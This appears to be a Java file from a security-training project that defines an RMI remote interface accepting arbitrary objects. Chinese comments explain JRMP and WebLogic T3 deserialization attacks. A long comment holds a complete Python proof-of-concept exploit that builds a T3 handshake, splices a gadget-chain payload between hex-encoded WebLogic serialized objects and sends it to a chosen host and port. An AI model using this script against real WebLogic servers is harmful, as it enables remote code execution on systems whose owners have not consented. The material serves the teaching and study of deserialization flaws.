package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import java.rmi.Remote;
import java.rmi.RemoteException;

/**
 * 1. 服务端与客户端，攻击注册中心
 * 2. 注册中心，攻击客户端与服务端
 * 3. 客户端攻击服务端
 * 4. 服务端攻击客户端
 */
public interface User extends Remote {

    String name(String name) throws RemoteException;
    void say(String say) throws RemoteException;

    // 发送Object
    void dowork(Object work) throws RemoteException;

    // 接收Object
    Object getwork() throws Exception;
}




/**
 * 漏洞利用介绍：
 *  1、JRMP:
 *          Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。
 *          这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。
 *
 *  2、简单理解就是：
 *          JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。
 */


/*
 *  3、Weblogic t3 反序列化：
 *       （1）JRMP是Java默认RMI的通信协议，而Weblogic实现的RMI的通信协议主要为t3（还有基于CORBA的IIOP协议）。
 *       （2）T3协议由协议头包裹（前四个字节为数据包大小），且数据包中包含多个序列化的对象（每个序列化数据包前面都有相同的二进制串(0xfe010000)），通信的时候会读取序列化对象进行反序列化。
 *       （3）那么我们就可以替换其中的两个0xfe010000字节流中间的序列化数据为可控的恶意序列化数据。（例如：0xfe010000“恶意的序列化数据”0xfe010000）
 *
 *       (4)总结：
 *          # T3是WebLogic的RMI通信协议；
 *          # RMI通信时会将对象进行序列化传输；
 *          # 通过替换T3协议头中，两个“0xfe010000”中间的内容为恶意序列化数据；
 *          # 构造请求，实施“RMI T3”反序列化攻击。
 */


/**
 * 1、简单的payload如下：
 *      （1）先生成gadget链的数据；
 *      （2）然后用这个恶意序列化数据拼接到t3数据流中；
 *      （3）再重新计算数据流长度替换前四个字节发送。
 *
 *  2、py编写poc范例：
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
# -*- coding: utf-8 -*-

import socket
import struct
import sys

def exp(filename, host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (host, int(port))
    data = ""
    try:
        sock.connect(server_address)
        headers = 't3 12.2.1\nAS:255\nHL:19\n\n'.format(port)
        sock.sendall(headers)
        data = sock.recv(2)
        print(data)
        f = open(filename, 'rb')
        payload_obj = f.read()
        f.close()
        payload1 = "000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000".decode('hex')
        payload3 = "aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078".decode('hex')
        payload2 = payload_obj
        payload = payload1 + payload2 + payload3

        payload = struct.pack('>I', len(payload)) + payload[4:]

        sock.send(payload)
        data = sock.recv(4096)
        print(data)
    except socket.error as e:
        print (u'socket 连接异常！')
    finally:
        sock.close()

if(len(sys.argv)<4):
    print("usage: python t3.py ser.data ip port")
else:
    filename = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    exp(filename, ip, port)
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
 */